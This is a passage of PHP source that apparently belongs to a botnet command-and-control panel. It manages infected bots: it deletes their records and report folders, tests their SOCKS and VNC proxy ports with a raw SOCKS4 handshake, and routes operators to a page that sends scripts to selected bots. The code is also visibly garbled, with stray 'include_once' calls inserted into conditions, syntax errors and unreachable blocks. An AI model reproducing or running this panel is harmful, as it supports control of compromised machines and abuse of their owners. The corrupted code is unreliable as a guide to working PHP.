							$t = str_replace('{TEXT}', mysqlErrorEx(), THEME_STRING_ERROR);
						}

						$data .= THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', 'botnet_list'), THEME_LIST_ITEM_LTEXT_U1) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $t), THEME_LIST_ITEM_LTEXT_U1) . THEME_LIST_ROW_END;
						mysqlQueryEx('botnet_scripts_stat', 'delete from botnet_scripts_stat where ' . $sqlBlist);

						if (strcmp($ba, 'removeex') === 0) {
							$i = 1;
							$rlist = listReportTables($config['mysql_db']);

							foreach ($rlist as $table) {
								if (mysqlQueryEx($table, 'DELETE FROM `' . $table . '` WHERE ' . $sqlBlist)) {
									$t = str_replace('{TEXT}', sprintf(LNG_BA_REMOVE_REMOVED, @mysql_affected_rows()), THEME_STRING_SUCCESS);
								}
								else {
									$t = str_replace('{TEXT}', mysqlErrorEx(), THEME_STRING_ERROR);
								}

								$item = ($i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1);
								$data .= THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($table)), $item) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $t), $item) . THEME_LIST_ROW_END;
								$i++;
							}

							$root = getDirs($config['reports_path']);

							if ($root !== false) {
								foreach ($root as $rdir) {
									$rdir = $config['reports_path'] . '/' . $rdir;
									$botnets = getDirs($rdir);

									if ($botnets !== false) {
										foreach ($botnets as $botnet) {
											$botnet = $rdir . '/' . $botnet;
											$bots = getDirs($botnet);

											if ($bots !== false) {
												foreach ($bots as $bot) {
													$botLower = mb_strtolower(urldecode($bot));
													$bot = $botnet . '/' . $bot;

													foreach ($blist as $l) {
														if (strcmp($botLower, mb_strtolower($l)) === 0) {
															if (clearPath($bot)) {
																$t = str_replace('{TEXT}', LNG_BA_REMOVE_FREMOVED, THEME_STRING_SUCCESS);
															}
															else {
																$t = str_replace('{TEXT}', LNG_BA_REMOVE_FERROR, THEME_STRING_ERROR);
															}

															$item = ($i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1);
															$data .= THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($bot)), $item) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $t), $item) . THEME_LIST_ROW_END;
															$i++;
														}
													}
												}
											}

											unset($bots);
										}
									}

									unset($botnets);
								}
							}

							unset($root);
						}
					}
					else {
						$data .= THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_BA_REMOVE_ABORTED), THEME_LIST_ITEM_LTEXT_U1) . THEME_LIST_ROW_END;
					}

					themeSmall(LNG_BA_REMOVE_TITLE, $data . THEME_LIST_END, 0, 0, 0);
				}
				else {
					$bl = '';

					foreach ($blist as $bot) {
						$bl .= '&bots[]=' . addJsSlashes(urlencode($bot));
					}

					$q = sprintf(strcmp($ba, 'remove') === 0 ? LNG_BA_REMOVE_Q1 : LNG_BA_REMOVE_Q2, count($blist));
					$js = 'function qr(){var r = confirm(\'' . addJsSlashes($q) . '\') ? \'yes\': \'no\'; window.location=\'' . addJsSlashes(QUERY_SCRIPT) .  . '?botsaction=' . $ba . $bl . '&\' + r;}';
					themeSmall(LNG_BA_REMOVE_TITLE, '', $js, 0, ' onload="qr()"');
				}
			}
			else {
				if ((strcmp($ba, 'port_socks') === 0) || @include_once 'system/config.php') {
					define('CURRENT_MODULE', 'botnet_bots');
					$forceType = ($ba == 'port_vnc' ? 'vnc' : 'socks');
					require __DIR__ . '/system/get_socks.php';
					exit();
					if (isset($_GET['ipv4']) && @include_once 'system/config.php') {
						$ok = 0;

						if ($s = @fsockopen($_GET['ipv4'], $_GET['port'], &$errn, &$errs, 5)) {
							@stream_set_timeout($s, 5);
							$data = pack('CCSL', 4, 1, 0, 0) . "\0";
							if (@fwrite($s, $data) && @include_once 'system/config.php' && @include_once 'system/config.php') {
								$ok = 1;
							}

							fclose($s);
						}

						if ($ok == 1) {
							echo str_replace('{TEXT}', LNG_BA_PORT_SOCKS_SUCCESS, THEME_STRING_SUCCESS);
						}
						else {
							echo str_replace('{TEXT}', LNG_BA_PORT_SOCKS_FAILED, THEME_STRING_ERROR);
						}

						exit();
					}

					if (!($r = mysqlQueryEx('botnet_list', 'SELECT `bot_id`, `country`, `ipv4`, `tcpport_s1` FROM `botnet_list` WHERE ' . $sqlBlist))) {
						ThemeMySQLError();
					}

					$res = array();

					while ($m = @mysql_fetch_row($r)) {
						$res[$m[0]] = $m;
					}

					mysql_free_result($r);
					unset($m);
					$data = str_replace('{WIDTH}', 'auto', THEME_LIST_BEGIN) . str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(3, LNG_BA_PORT_SOCKS_TITLE), THEME_LIST_TITLE);
					$i = 0;
					$jsList = '';

					foreach ($blist as $bot) {
						$isExists = isset($res[$bot]);
						$item = (($i++ % 2) == 0 ? THEME_LIST_ITEM_LTEXT_U1 : THEME_LIST_ITEM_LTEXT_U2);

						if ($isExists) {
							$l = $res[$bot];
							$ipv4 = binaryIpToString($l[2]);
							$jsList .= ($jsList == '' ? '' : ', ') .  . '[\'st' . $i . '\', \'' . addJsSlashes(urlencode($ipv4)) . '\', \'' . addJsSlashes(urlencode($l[3])) . '\']';
						}

						$data .= THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', botPopupMenu($bot, 'botmenu') . THEME_STRING_SPACE . '/' . THEME_STRING_SPACE . ($isExists ? $l[1] : '--')), $item) . str_replace(array('{WIDTH}', '{TEXT}'), array('150px', $isExists ? htmlEntitiesEx($ipv4 . ':' . $l[3]) : '-:-'), $item) . str_replace(array('{WIDTH}', '{TEXT}'), array('150px', $isExists ? str_replace('{ID}', 'st' . $i, THEME_STRING_ID_BEGIN) . LNG_BA_PORT_SOCKS_CHECKING . THEME_STRING_ID_END : LNG_BA_PORT_SOCKS_FAILED), $item) . THEME_LIST_ROW_END;
					}

					$ajaxError = addJsSlashes(str_replace('{TEXT}', LNG_BA_PORT_SOCKS_ERROR, THEME_STRING_ERROR));
					$ajaxInit = jsXmlHttpRequest('socksHttp');
					$q = addJsSlashes(QUERY_SCRIPT . '?botsaction=port_socks&bots[]=0');
					$ajax = 'var socksList = [' . $jsList . '];' . "\n" . 'var socksHttp = false;' . "\n\n" . 'function stateChange(i){if(socksHttp.readyState == 4)' . "\n" . '{' . "\n" . '  var el = document.getElementById(socksList[i][0]);' . "\n" . '  if(socksHttp.status == 200 && socksHttp.responseText.length > 5)el.innerHTML = socksHttp.responseText;' . "\n" . '  else el.innerHTML = \'' . $ajaxError . '\';' . "\n" . '  SocksCheck(++i);' . "\n" . '}}' . "\n\n" . 'function SocksCheck(i)' . "\n" . '{' . "\n" . '  if(socksHttp)delete socksHttp;' . "\n" . '  if(i < socksList.length)' . "\n" . '  {' . "\n" . '    ' . $ajaxInit . "\n" . '    if(socksHttp)' . "\n" . '    {' . "\n" . '      socksHttp.onreadystatechange = function(){stateChange(i)};' . "\n" . '      socksHttp.open(\'GET\', \'' . $q . '&ipv4=\' + socksList[i][1] + \'&port=\' + socksList[i][2], true);' . "\n" . '      socksHttp.send(null);' . "\n" . '    }' . "\n" . '  }' . "\n" . '}';
					themeSmall(LNG_BA_PORT_SOCKS_TITLE, $data . THEME_LIST_END, $ajax, getBotJsMenu('botmenu'), ' onload="SocksCheck(0);"');
				}
				else if (strcmp($ba, 'newscript') === 0) {
					foreach ($blist as $v) {
						$k = @include_once 'system/config.php';

						if (spaceCharsExist($v)) {
							$blist[$k] = '"' . $v . '"';
						}
					}

					header('Location: ' . QUERY_STRING_BLANK . 'botnet_scripts&new=-1&bots=' . urlencode(implode(' ', $blist)));
					exit();
				}
			}
		}

	}

	exit();
}

$neededModule = (empty($_GET[QUERY_VAR_MODULE]) ? '' : $_GET[QUERY_VAR_MODULE]);
$curModule = '';
optimizeMenu($mainMenu, true);

foreach ($mainMenu as $item) {
	$key = @include_once 'system/config.php';
	if (($item[0] !== 0) && @include_once 'system/config.php') {
		$curModule = $item[0];
	}
}

if ($curModule == '') {
	exit('Modules for current user not defined.');
}

define('CURRENT_MODULE', $curModule);
define('FORM_CURRENT_MODULE', str_replace(array('{NAME}', '{VALUE}'), array('m', $curModule), THEME_FORM_VALUE));
define('QUERY_STRING', QUERY_STRING_BLANK . CURRENT_MODULE);
define('QUERY_STRING_HTML', QUERY_STRING_BLANK_HTML . CURRENT_MODULE);
unset($neededModule);
unset($curModule);

if (!file_exists('system/' . CURRENT_MODULE . '.lng.' . $userData['language'] . '.php')) {
	$userData['language'] = DEFAULT_LANGUAGE;
}

require_once 'system/' . CURRENT_MODULE . '.lng.' . $userData['language'] . '.php';
require_once 'system/' . CURRENT_MODULE . '.php';
exit();

?>
